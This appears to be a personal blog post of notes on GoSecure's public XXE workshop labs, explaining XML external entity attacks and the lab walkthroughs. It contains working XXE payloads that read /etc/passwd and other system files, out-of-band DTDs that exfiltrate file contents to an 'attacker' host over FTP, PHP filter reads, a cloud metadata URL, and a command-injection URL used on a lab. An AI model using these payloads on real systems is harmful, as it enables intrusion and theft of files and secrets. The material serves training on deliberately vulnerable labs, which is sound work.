@@ -1,0 +1,900 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="generator" content="Hugo 0.82.0" />
+
+  <title>Advanced XXE Labs (GoSecure) &middot; ☣ ishtar ☣</title>
+
+  <meta name="description" content="" />
+
+  
+
+<meta itemprop="name" content="Advanced XXE Labs (GoSecure)">
+<meta itemprop="description" content="GoSecure has released an amazing set of exercises, related to XXE (XML eXternal Entity) attacks.">
+
+<meta itemprop="wordCount" content="1364">
+<meta itemprop="keywords" content="xxe,dtd,oob,jar,gosecure," />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Advanced XXE Labs (GoSecure)"/>
+<meta name="twitter:description" content="GoSecure has released an amazing set of exercises, related to XXE (XML eXternal Entity) attacks."/>
+
+
+<meta property="og:title" content="Advanced XXE Labs (GoSecure)" />
+<meta property="og:description" content="GoSecure has released an amazing set of exercises, related to XXE (XML eXternal Entity) attacks." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://mxpapad.me/posts/xxe_workshop/xxe_workshop/" /><meta property="article:section" content="posts" />
+
+
+
+
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type":"Person",
+      "@id": "https://mxpapad.me/#author",
+      "name": "ishtar",
+      "image": {
+        "@type":"ImageObject",
+        
+        
+      },
+      "description": "988C 6C07 3240 2D14"
+    },
+    {
+      "@type": "WebSite",
+      "@id": "https://mxpapad.me/#website",
+      "url": "https://mxpapad.me/",
+      "name": "☣ ishtar ☣",
+      "description": "988C 6C07 3240 2D14",
+      "publisher": {
+        "@id": "https://mxpapad.me/#author"
+      },
+      "inLanguage": "en-us"
+    },
+    {
+      "@type": "WebPage",
+      "@id": "https://mxpapad.me/posts/xxe_workshop/xxe_workshop/#webpage",
+      "url": "https://mxpapad.me/posts/xxe_workshop/xxe_workshop/",
+      "name": "Advanced XXE Labs (GoSecure)",
+      "isPartOf": {
+        "@id": "https://mxpapad.me/#website"
+      },
+      "about": {
+         "@id": "https://mxpapad.me/#author"
+      },
+      "description": "GoSecure has released an amazing set of exercises, related to XXE (XML eXternal Entity) attacks.",
+      "inLanguage": "en-us",
+      "potentialAction": [
+        {
+          "@type": "ReadAction",
+          "target": [
+            "https://mxpapad.me/posts/xxe_workshop/xxe_workshop/"
+          ]
+        }
+      ]
+    },
+    {
+      "@type": "Article",
+      "isPartOf": {
+        "@id": "https://mxpapad.me/posts/xxe_workshop/xxe_workshop/#webpage"
+      },
+      "mainEntityOfPage": {
+        "@id": "https://mxpapad.me/posts/xxe_workshop/xxe_workshop/#webpage"
+      },
+      "headline": "Advanced XXE Labs (GoSecure)",
+      "publisher": {
+        "@id": "https://mxpapad.me/#author"
+      },
+      "keywords": [
+        "xxe",
+        "dtd",
+        "oob",
+        "jar",
+        "gosecure"
+      ],
+      "articleSection": [
+      ],
+      "inLanguage": "en-us",
+      "author": {
+        "@type": "Person",
+        "name": "ishtar"
+      },
+      "potentialAction": [
+        {
+          "@type": "CommentAction",
+          "name": "Comment",
+          "target": [
+            "https://mxpapad.me/posts/xxe_workshop/xxe_workshop/#comments"
+          ]
+        }
+      ]
+    }
+  ]
+}
+</script>
+
+
+
+  <link type="text/css"
+        rel="stylesheet"
+        href="/css/print.css"
+        media="print">
+
+  <link type="text/css"
+        rel="stylesheet"
+        href="/css/poole.css">
+
+  <link type="text/css"
+        rel="stylesheet"
+        href="/css/hyde.css">
+
+  
+<style type="text/css">
+  .sidebar {
+    background-color: #333333;
+  }
+
+  .read-more-link a {
+    border-color: #333333;
+  }
+
+  .read-more-link a:hover {
+    background-color: #333333;
+  }
+
+  .pagination li a {
+    color: #333333;
+    border: 1px solid #333333;
+  }
+
+  .pagination li.active a {
+    background-color: #333333;
+  }
+
+  .pagination li a:hover {
+    background-color: #333333;
+    opacity: 0.75;
+  }
+
+  footer a,
+  .content a,
+  .related-posts li a:hover {
+    color: #333333;
+  }
+</style>
+
+
+
+  
+
+  <link rel="stylesheet"
+        href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700&display=swap">
+
+  <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/css/all.min.css"
+        integrity="sha256-mmgLkCYLUQbXn0B1SRqzHar6dCnv9oZFPEC1g1cwlkk="
+        crossorigin="anonymous" />
+
+  <link rel="apple-touch-icon-precomposed"
+        sizes="144x144"
+        href="/apple-touch-icon-144-precomposed.png">
+
+  <link rel="shortcut icon" href="/favicon.png">
+
+  
+  </head>
+<body>
+  <aside class="sidebar">
+  <div class="container">
+    <div class="sidebar-about">
+      
+        
+      
+
+      <h1>☣ ishtar ☣</h1>
+
+      
+      <p class="lead">988C 6C07 3240 2D14</p>
+      
+    </div>
+
+    <nav>
+      <ul class="sidebar-nav">
+        <li>
+          <a href="https://mxpapad.me/">~</a>
+        </li>
+        <li>
+          <a href="/posts/">~/posts</a>
+        </li><li>
+          <a href="/about/">~/about</a>
+        </li>
+      </ul>
+    </nav>
+
+    <section class="social-icons">
+      
+      <a href="https://www.linkedin.com/in/michalis-papadopoullos/" rel="me" title="Linkedin" target="_blank">
+        <i class="fab fa-linkedin" aria-hidden="true"></i>
+      </a>
+      
+      <a href="https://github.com/xmpf" rel="me" title="GitHub" target="_blank">
+        <i class="fab fa-github" aria-hidden="true"></i>
+      </a>
+      
+      <a href="https://twitter.com/megatr0nz" rel="me" title="Twitter" target="_blank">
+        <i class="fab fa-twitter" aria-hidden="true"></i>
+      </a>
+      
+    </section>
+  </div>
+</aside>
+
+
+  <main class="content container">
+  <div class="post">
+  <h1 class="title">Advanced XXE Labs (GoSecure)</h1>
+  
+
+  <div class="post-date">
+  </div>
+
+  <div>
+  <p><a href="https://gosecure.github.io/xxe-workshop/">GoSecure</a> has released an amazing set of <a href="https://github.com/GoSecure/xxe-workshop">exercises</a>, related to XXE (XML eXternal Entity) attacks. These are my notes by following the workshop.</p>
+<blockquote>
+<h4 id="disclaimer">Disclaimer</h4>
+<p>Most of the content is taken directly from <a href="https://gosecure.github.io/xxe-workshop">HERE</a>.<br>
+Many thanks to GoSecure for releasing this workshop to the public.</p>
+</blockquote>
+<h3 id="xml-external-entities-xxe">XML eXternal Entities (XXE)</h3>
+<p><img src="/xxe_workshop/basic_xxe_payload.png" alt=""></p>
+<p>Interesting files:</p>
+<ul>
+<li>file:///etc/passwd</li>
+<li>file:///etc/hosts</li>
+<li>file:///etc/resolv.conf</li>
+<li>file:///proc/net/dev</li>
+<li>file:///proc/self/environ</li>
+<li>file:///proc/self/cmdline</li>
+<li>file:///proc/version</li>
+<li>file:///etc/crontab</li>
+</ul>
+<h3 id="out-of-band-exfiltration-oob">Out of Band Exfiltration (OOB)</h3>
+<p>XML parsing remotely will not always return content directly. If you are uploading a document such as a data file (.xml) or a MS Office document (.docx), you might not receive the content parse from those documents.</p>
+<!-- raw HTML omitted -->
+<p><img src="/xxe_workshop/external-dtd.gif" alt="external-dtd"></p>
+<p>The <!-- raw HTML omitted -->above technique is not perfect as it would fail to parse any file with XML incompatitble characters<!-- raw HTML omitted -->. See <a href="http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html">LINK</a> for a workaround using FTP protocol.</p>
+<p><strong>Payload</strong>:</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-xml" data-lang="xml"><span style="color:#999;font-weight:bold;font-style:italic">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+<span style="color:#999;font-weight:bold;font-style:italic">&lt;!DOCTYPE data [ 
+</span><span style="color:#999;font-weight:bold;font-style:italic">    &lt;!ENTITY % file SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
+    <span style="color:#999;font-weight:bold;font-style:italic">&lt;!ENTITY % dtd SYSTEM &#34;http://attacker/xxe.dtd&#34;&gt;</span> 
+    %dtd;
+]&gt;
+<span style="color:#000080">&lt;data&gt;</span><span style="color:#800080">&amp;send;</span><span style="color:#000080">&lt;/data&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><strong>xxe.dtd</strong>:</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-xml" data-lang="xml"><span style="color:#999;font-weight:bold;font-style:italic">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+<span style="color:#999;font-weight:bold;font-style:italic">&lt;!ENTITY % all &#34;&lt;!ENTITY send SYSTEM &#39;ftp://test:%file;@attacker/&#39;&gt;</span>&#34;&gt; %all;
+</code></pre></td></tr></table>
+</div>
+</div><p>Using the above method, an HTTP web server will be needed to serve the <code>xxe.dtd</code> file and an FTP server to exfiltrate the contents of the file. The contents will be sent to the FTP server as input for the password of user <code>test</code>.</p>
+<blockquote>
+<p>Note: <a href="https://www.xxe.sh/">xxe.sh</a> is a handy tool for generating both xxe.dtd and payload.</p>
+</blockquote>
+<p>For the FTP server the available options are listed below:</p>
+<ul>
+<li><a href="https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb">https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb</a></li>
+<li><a href="https://github.com/lc/230-OOB">https://github.com/lc/230-OOB</a></li>
+<li><a href="https://github.com/staaldraad/xxeserv">https://github.com/staaldraad/xxeserv</a></li>
+<li><code>python3 -m pyftpdlib -p 21</code></li>
+</ul>
+<h3 id="filter-encoding">Filter Encoding</h3>
+<p>XXE have major limitations regarding which file can be read. In general, you can&rsquo;t read non-ASCII characters or special characters that are not XML compatible.</p>
+<p>In order to read files with special characters, in PHP, we can leverage its filter encoding feature to encode file contents in base64 format.
+<code>php://filter/convert.base64-encode/resource=/etc/passwd</code></p>
+<h3 id="protocols">Protocols</h3>
+<ul>
+<li><code>file://C:/Windows/System32/inetsrv/config/applicationHost.config</code></li>
+<li><code>http[s]://169.254.169.254/latest/user-data</code></li>
+<li><code>ftp://user:password@internal.company.net/file</code></li>
+<li><code>gopher://server/?data</code>
+<ul>
+<li>Another option for data exfiltration is the gopher protocol. It allows to connect to any server with a TCP with an arbitrary message. The path section of the URL is the data that will be written to the TCP socket. It is rarely available as it requires very old versions of Java</li>
+</ul>
+</li>
+<li><code>jar:file://./archive.zip!config.properties</code>
+<ul>
+<li>The jar protocol is a very special case. It is only available on Java applications. It allows to access files inside a PKZIP archive (.zip, .jar, &hellip;).</li>
+<li>It works for local and <strong>remote</strong> archives.</li>
+</ul>
+</li>
+<li><code>netdoc:///etc/passwd</code>
+<ul>
+<li>This protocol is alternative to the file:// protocol. It is of limited use. It is often cited as a method to bypass some WAF blocking.</li>
+</ul>
+</li>
+</ul>
+<p>More on <strong>JAR:FILE://</strong> protocol:</p>
+<p><img src="/xxe_workshop/jar_pseudo_protocol.png" alt=""></p>
+<p>When accessing remote archives, the file is downloaded temporarily in /tmp/ directory and the requested file is extracted. These files are removed when the connection is closed. We can control the duration of our connection being open using some custom modified web servers. Writing files in a temporary directory can help escalate another vulnerability that involves a path traversal (such as local file include, template injection, XSLT RCE, deserialization, etc).</p>
+<hr>
+<pre><code> In order to deploy the challenges:
+    1. chmod +x ./gradlew   (if available)
+    2. ./gradlew build      (if available)
+    3. sudo docker build .
+    4. sudo docker-compose up --build
+</code></pre>
+<hr>
+<h3 id="lab-1-basic-xxe">Lab 1: Basic XXE</h3>
+<p><img src="/xxe_workshop/lab1_basic_xxe.png" alt=""></p>
+<p>By inspecting the XML data fetched from Wired Magazine:</p>
+<pre><code>&lt;!DOCTYPE X [ &lt;!ENTITY x SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;
+&lt;item&gt;
+    &lt;title&gt;XXE&lt;/title&gt;
+    &lt;link&gt;&lt;/link&gt;
+    &lt;description&gt;&amp;x;&lt;/description&gt;
+&lt;/item&gt;
+</code></pre><p><img src="/xxe_workshop/lab1_etc_passwd.png" alt=""></p>
+<h3 id="lab-2-oob-attack">Lab 2: OOB Attack</h3>
+<p><img src="/xxe_workshop/lab2_external_dtd.png" alt=""></p>
+<p>We could exfiltrate with the following payload, although is a lot of work as the output will be rendered as image.</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-xml" data-lang="xml"><span style="color:#999;font-weight:bold;font-style:italic">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+<span style="color:#999;font-weight:bold;font-style:italic">&lt;!DOCTYPE X [ &lt;!ENTITY x SYSTEM &#34;file:///&#34;&gt;</span> ]&gt;
+<span style="color:#000080">&lt;svg</span> <span style="color:#008080">xmlns=</span><span style="color:#d14">&#34;http://www.w3.org/2000/svg&#34;</span> <span style="color:#008080">width=</span><span style="color:#d14">&#34;1200cm&#34;</span><span style="color:#000080">&gt;</span>
+<span style="color:#000080">&lt;text</span> <span style="color:#008080">x=</span><span style="color:#d14">&#34;1&#34;</span> <span style="color:#008080">y=</span><span style="color:#d14">&#34;20&#34;</span><span style="color:#000080">&gt;</span><span style="color:#800080">&amp;x;</span><span style="color:#000080">&lt;/text&gt;</span>
+<span style="color:#000080">&lt;/svg&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="method-1-file">Method 1: FILE://</h4>
+<p><strong>DTD</strong></p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-xml" data-lang="xml"><span style="color:#999;font-weight:bold;font-style:italic">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+<span style="color:#999;font-weight:bold;font-style:italic">&lt;!ENTITY % all &#34;&lt;!ENTITY send SYSTEM &#39;file://172.19.0.1:21/%file;&#39;&gt;</span>&#34;&gt; %all;
+</code></pre></td></tr></table>
+</div>
+</div><p><strong>FTP server</strong>
+<code>sudo python3 -m pyftpdlib -p 21</code></p>
+<p><strong>Payload</strong></p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-xml" data-lang="xml"><span style="color:#999;font-weight:bold;font-style:italic">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+<span style="color:#999;font-weight:bold;font-style:italic">&lt;!DOCTYPE foo [
+</span><span style="color:#999;font-weight:bold;font-style:italic"> &lt;!ENTITY % file SYSTEM &#34;file:///etc/&#34;&gt;</span>
+ <span style="color:#999;font-weight:bold;font-style:italic">&lt;!ENTITY % dtd SYSTEM &#34;file://172.19.0.1:21/xxe.dtd&#34;&gt;</span>
+%dtd;]&gt;
+<span style="color:#000080">&lt;svg</span> <span style="color:#008080">xmlns=</span><span style="color:#d14">&#34;http://www.w3.org/2000/svg&#34;</span> <span style="color:#008080">width=</span><span style="color:#d14">&#34;12cm&#34;</span> <span style="color:#008080">height=</span><span style="color:#d14">&#34;12cm&#34;</span><span style="color:#000080">&gt;</span>
+    <span style="color:#000080">&lt;text</span> <span style="color:#008080">x=</span><span style="color:#d14">&#34;10&#34;</span> <span style="color:#008080">y=</span><span style="color:#d14">&#34;10&#34;</span><span style="color:#000080">&gt;</span><span style="color:#800080">&amp;send;</span><span style="color:#000080">&lt;/text&gt;</span>
+<span style="color:#000080">&lt;/svg&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="method-2-http--file">Method 2: HTTP:// + FILE://</h4>
+<p>This time we will spawn an HTTP server to retrieve the DTD file and an FTP server to exfiltrate the results.</p>
+<p><strong>Web server</strong>
+<code>python3 -m http.server</code></p>
+<p><strong>FTP server</strong>
+<code>sudo ruby ftp_server.rb</code></p>
+<p><strong>DTD</strong></p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-xml" data-lang="xml"><span style="color:#999;font-weight:bold;font-style:italic">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+<span style="color:#999;font-weight:bold;font-style:italic">&lt;!ENTITY % all &#34;&lt;!ENTITY send SYSTEM &#39;file://test:test@172.19.0.1:21/%file;&#39;&gt;</span>&#34;&gt; %all;
+</code></pre></td></tr></table>
+</div>
+</div><p><strong>Payload</strong></p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-xml" data-lang="xml"><span style="color:#999;font-weight:bold;font-style:italic">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+<span style="color:#999;font-weight:bold;font-style:italic">&lt;!DOCTYPE foo [
+</span><span style="color:#999;font-weight:bold;font-style:italic"> &lt;!ENTITY % file SYSTEM &#34;file:///etc/&#34;&gt;</span>
+ <span style="color:#999;font-weight:bold;font-style:italic">&lt;!ENTITY % dtd SYSTEM &#34;http://172.19.0.1:8000/xxe.dtd&#34;&gt;</span>
+%dtd;]&gt;
+<span style="color:#000080">&lt;svg</span> <span style="color:#008080">xmlns=</span><span style="color:#d14">&#34;http://www.w3.org/2000/svg&#34;</span> <span style="color:#008080">width=</span><span style="color:#d14">&#34;12cm&#34;</span> <span style="color:#008080">height=</span><span style="color:#d14">&#34;12cm&#34;</span><span style="color:#000080">&gt;</span>
+    <span style="color:#000080">&lt;text</span> <span style="color:#008080">x=</span><span style="color:#d14">&#34;10&#34;</span> <span style="color:#008080">y=</span><span style="color:#d14">&#34;10&#34;</span><span style="color:#000080">&gt;</span><span style="color:#800080">&amp;send;</span><span style="color:#000080">&lt;/text&gt;</span>
+<span style="color:#000080">&lt;/svg&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="method-3-ftp--file">Method 3: FTP:// + FILE://</h4>
+<p>This is the same method as the previous one, but using <code>ftp://</code> scheme to retrieve the DTD and <code>file://</code> scheme to exfiltrate data.</p>
+<h3 id="lab-3-filter-encoding">Lab 3: Filter Encoding</h3>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-xml" data-lang="xml"><span style="color:#999;font-weight:bold;font-style:italic">&lt;!DOCTYPE X [ &lt;!ENTITY x SYSTEM &#34;php://filter/convert.base64-encode/resource=./test_dev.php&#34;&gt;</span> ]&gt;
+<span style="color:#000080">&lt;item&gt;</span>
+    <span style="color:#000080">&lt;title&gt;</span><span style="color:#800080">&amp;x;</span><span style="color:#000080">&lt;/title&gt;</span>
+<span style="color:#000080">&lt;/item&gt;</span>
+
+---
+
+view-source:http://127.0.0.1:8023/test_dev.php?func=system<span style="color:#a61717;background-color:#e3d2d2">&amp;</span>val=cat%3C/secret/flag_readme.txt
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="lab-4-jarfile">Lab 4: JAR:FILE://</h3>
+<p><img src="/xxe_workshop/lab4_landing_page.png" alt=""></p>
+<p>The admin endpoint needs authentication, but we don&rsquo;t have the credentials.
+SQL Injection to bypass the login doesn&rsquo;t work either.</p>
+<p>From <code>robots.txt</code> file, another directory called <code>backup</code> is exposed.</p>
+<p><img src="/xxe_workshop/lab4_exposed_sql.png" alt=""></p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-sql" data-lang="sql">(<span style="color:#099">1</span>,<span style="color:#d14">&#34;morikonoye&#34;</span>, <span style="color:#d14">&#34;7E124F98288AF4E5C0B3A6024704696D7DFD8FE7674B9BC77696F0270CE23672C523F8E0051F4B03774D57F21792DAD4EA2C3FAC6792BC9922107A88859C4739&#34;</span>,<span style="color:#d14">&#34;user&#34;</span>);
+
+<span style="color:#000;font-weight:bold">INSERT</span> <span style="color:#000;font-weight:bold">INTO</span> <span style="color:#000;font-weight:bold">`</span>users<span style="color:#000;font-weight:bold">`</span> <span style="color:#000;font-weight:bold">VALUES</span> (<span style="color:#099">2</span>,<span style="color:#d14">&#34;guest&#34;</span>, <span style="color:#d14">&#34;C6F1E45D9E20DD6E8DF58F280CE04F2C3D5FA8F588BD30BD96611D3A351FE2AAB1D22BB0914EF3BD70BE627C57B3472D940324EABBDE7D7042D4F76D78007130&#34;</span>,<span style="color:#d14">&#34;user&#34;</span>);
+
+<span style="color:#000;font-weight:bold">INSERT</span> <span style="color:#000;font-weight:bold">INTO</span> <span style="color:#000;font-weight:bold">`</span>users<span style="color:#000;font-weight:bold">`</span> <span style="color:#000;font-weight:bold">VALUES</span> (<span style="color:#099">3</span>,<span style="color:#d14">&#34;tseitaro&#34;</span>, <span style="color:#d14">&#34;230F853BF6FBB0E0841E1DE5BC542D6797379C304E3AAC54EC2C72FFDF0C50D1D2F1EACB4659598C74E2428F1EB436D7E26EF8838D1B99ADF1C717759E71B1E7&#34;</span>,<span style="color:#d14">&#34;user&#34;</span>);
+
